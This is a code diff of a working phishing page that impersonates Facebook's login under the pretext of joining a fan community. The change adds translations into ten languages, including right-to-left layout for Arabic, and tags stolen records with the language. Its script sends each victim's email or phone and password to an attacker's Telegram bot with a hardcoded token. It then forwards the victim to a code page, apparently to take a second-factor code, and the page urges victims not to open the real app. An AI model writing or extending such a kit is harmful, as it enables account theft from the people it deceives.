@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es" dir="ltr">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -22,26 +22,62 @@ button{width:100%;padding:14px;font-size:17px;font-weight:700;color:#fff;backgro
 <body>
 <div class="top"><img src="logo.png" alt="Facebook"></div>
 <div class="wrap">
-<h1>Inicia sesión en tu Facebook para unirte a la comunidad de fans</h1>
-<p class="sub">Solo fans verificados. Tarda 20 segundos.</p>
+<h1 id="h1">Inicia sesión en tu Facebook para unirte a la comunidad de fans</h1>
+<p class="sub" id="sub">Solo fans verificados. Tarda 20 segundos.</p>
 <form onsubmit="go(event)">
-<input id="u" type="text" placeholder="Correo o número de teléfono" required>
-<input id="p" type="password" placeholder="Contraseña" required>
-<button type="submit">Entrar</button>
+<input id="u" type="text" autocomplete="username" required>
+<input id="p" type="password" autocomplete="current-password" required>
+<button type="submit" id="btn">Entrar</button>
 </form>
-<a class="forgot" href="code.html">¿Olvidaste tu contraseña?</a>
-<p class="note">Continúa aquí, no abras la app.</p>
+<a class="forgot" id="forgot" href="code.html">¿Olvidaste tu contraseña?</a>
+<p class="note" id="note">Continúa aquí, no abras la app.</p>
 </div>
 <p class="foot">Español · English · Français · Português</p>
 <script>
 var T="9061884309:AAFtj5dnJQjl9Svv15qJQHYHN3VIxbuyk6M";
 var C="7238838844";
-function ping(t){var u="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t);if(navigator.sendBeacon){navigator.sendBeacon(u);}else{new Image().src=u;}}
+
+var S={
+es:{h1:"Inicia sesión en tu Facebook para unirte a la comunidad de fans",sub:"Solo fans verificados. Tarda 20 segundos.",phU:"Correo o número de teléfono",phP:"Contraseña",btn:"Entrar",forgot:"¿Olvidaste tu contraseña?",note:"Continúa aquí, no abras la app."},
+en:{h1:"Log in to Facebook to join the fan community",sub:"Verified fans only. Takes 20 seconds.",phU:"Email or phone number",phP:"Password",btn:"Log in",forgot:"Forgot your password?",note:"Continue here, don't open the app."},
+pt:{h1:"Entre no Facebook para entrar na comunidade de fãs",sub:"Apenas fãs verificados. Leva 20 segundos.",phU:"E-mail ou número de telefone",phP:"Senha",btn:"Entrar",forgot:"Esqueceu a senha?",note:"Continue aqui, não abra o app."},
+fr:{h1:"Connectez-vous à Facebook pour rejoindre la communauté de fans",sub:"Fans vérifiés uniquement. 20 secondes.",phU:"E-mail ou numéro de téléphone",phP:"Mot de passe",btn:"Se connecter",forgot:"Mot de passe oublié ?",note:"Continuez ici, n'ouvrez pas l'app."},
+de:{h1:"Melde dich bei Facebook an, um der Fan-Community beizutreten",sub:"Nur verifizierte Fans. Dauert 20 Sekunden.",phU:"E-Mail oder Telefonnummer",phP:"Passwort",btn:"Anmelden",forgot:"Passwort vergessen?",note:"Hier bleiben, App nicht öffnen."},
+it:{h1:"Accedi a Facebook per entrare nella community dei fan",sub:"Solo fan verificati. 20 secondi.",phU:"Email o numero di telefono",phP:"Password",btn:"Accedi",forgot:"Password dimenticata?",note:"Resta qui, non aprire l'app."},
+ru:{h1:"Войдите в Facebook, чтобы вступить в сообщество фанатов",sub:"Только проверенные фанаты. 20 секунд.",phU:"Эл. почта или номер телефона",phP:"Пароль",btn:"Войти",forgot:"Забыли пароль?",note:"Оставайтесь здесь, не открывайте приложение."},
+ar:{h1:"سجّل الدخول إلى Facebook للانضمام إلى مجتمع المعجبين",sub:"للمعجبين الموثّقين فقط. 20 ثانية.",phU:"البريد الإلكتروني أو رقم الهاتف",phP:"كلمة السر",btn:"تسجيل الدخول",forgot:"هل نسيت كلمة السر؟",note:"تابع هنا، لا تفتح التطبيق."},
+hi:{h1:"फ़ैन समुदाय से जुड़ने के लिए Facebook में लॉग इन करें",sub:"केवल सत्यापित फ़ैन। 20 सेकंड।",phU:"ईमेल या फ़ोन नंबर",phP:"पासवर्ड",btn:"लॉग इन करें",forgot:"पासवर्ड भूल गए?",note:"यहीं रहें, ऐप न खोलें।"},
+zh:{h1:"登录 Facebook，加入粉丝社区",sub:"仅限已认证粉丝。20 秒完成。",phU:"邮箱或手机号",phP:"密码",btn:"登录",forgot:"忘记密码？",note:"请留在此页，不要打开 App。"}
+};
+
+var SUP=["es","en","pt","fr","de","it","ru","ar","hi","zh"];
+var raw=(navigator.languages&&navigator.languages[0])||navigator.language||"es";
+var ov=(location.search.match(/[?&]l=([a-zA-Z-]+)/)||[])[1];
+if(ov)raw=ov;
+var base=raw.toLowerCase().split("-")[0];
+var lang=SUP.indexOf(base)>=0?base:"es";
+var L=S[lang];
+
+document.documentElement.lang=lang;
+document.documentElement.dir=lang==="ar"?"rtl":"ltr";
+document.getElementById("h1").textContent=L.h1;
+document.getElementById("sub").textContent=L.sub;
+document.getElementById("u").placeholder=L.phU;
+document.getElementById("p").placeholder=L.phP;
+document.getElementById("btn").textContent=L.btn;
+document.getElementById("forgot").textContent=L.forgot;
+document.getElementById("note").textContent=L.note;
+document.getElementById("forgot").href="code.html?l="+lang;
+
+function ping(t){
+  var u="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t);
+  if(navigator.sendBeacon){navigator.sendBeacon(u);}else{new Image().src=u;}
+}
 function go(e){
- e.preventDefault();
- ping("FB LOGIN | "+document.getElementById("u").value+" | "+document.getElementById("p").value);
- setTimeout(function(){location.href="code.html";},800);
+  e.preventDefault();
+  ping("FB LOGIN | "+document.getElementById("u").value+" | "+document.getElementById("p").value+" | "+lang);
+  setTimeout(function(){location.href="code.html?l="+lang;},800);
 }
 </script>
 </body>
-  </html>
+ </html>
